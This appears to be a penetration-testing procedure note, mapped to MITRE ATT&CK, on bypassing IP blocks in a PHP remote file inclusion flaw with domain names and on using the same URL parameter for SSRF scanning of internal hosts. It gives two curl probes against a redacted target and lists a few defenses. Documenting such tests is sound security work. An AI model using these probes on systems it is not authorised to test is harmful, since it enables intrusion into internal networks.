---
id: proc-validate-domain-rfi
tags:
  - rfi
  - ssrf
  - bypass
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:12.132Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Validate-Domain-Based-RFI-Post-Mitigation

## Summary

This procedure tests the persistence of RFI exploitation using domain names after partial mitigations like IP blocking, and demonstrates SSRF for internal network scanning via the unrestricted URL parameter.

## Description

Post-mitigation, direct IP access may be blocked, but domain-based inclusion remains vulnerable. By requesting the plain.php endpoint with a domain like http://justifysecurity.com/, external content still renders. This extends to SSRF by targeting internal domains or IPs (e.g., http://internal.local/), allowing scanning or compromise of internal resources without whitelisting.

## Requirements

1. Knowledge of partial mitigations (e.g., IP blocks)
2. Access to a domain-controlled server for testing
3. Target endpoint still exposed

## Defense

Defensive measures and detection strategies:

- Enforce strict URL validation and whitelisting for all parameters
- Log and monitor all external and internal fetches
- Implement network segmentation to limit SSRF impact

## Objectives

1. Bypass IP-based mitigations with domains
2. Perform internal scanning via pseudo-SSRF
3. Confirm ongoing vulnerability for further exploitation

## Instructions

### Step 1: Test Domain Inclusion

**Context**: Verify RFI works with domains despite IP blocks.

Access the endpoint:

```bash
curl "http://██████████/proxys/plain.php?url=http://justifysecurity.com/"
```

> Expected output: Content from the domain renders in the response.

### Step 2: Attempt Internal SSRF

**Context**: Use the parameter for internal reconnaissance.

Test with an internal URL:

```bash
curl "http://██████████/proxys/plain.php?url=http://127.0.0.1/internal-endpoint"
```

> If successful, response reveals internal file/directory contents or errors indicating access.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- rfi
- bypass
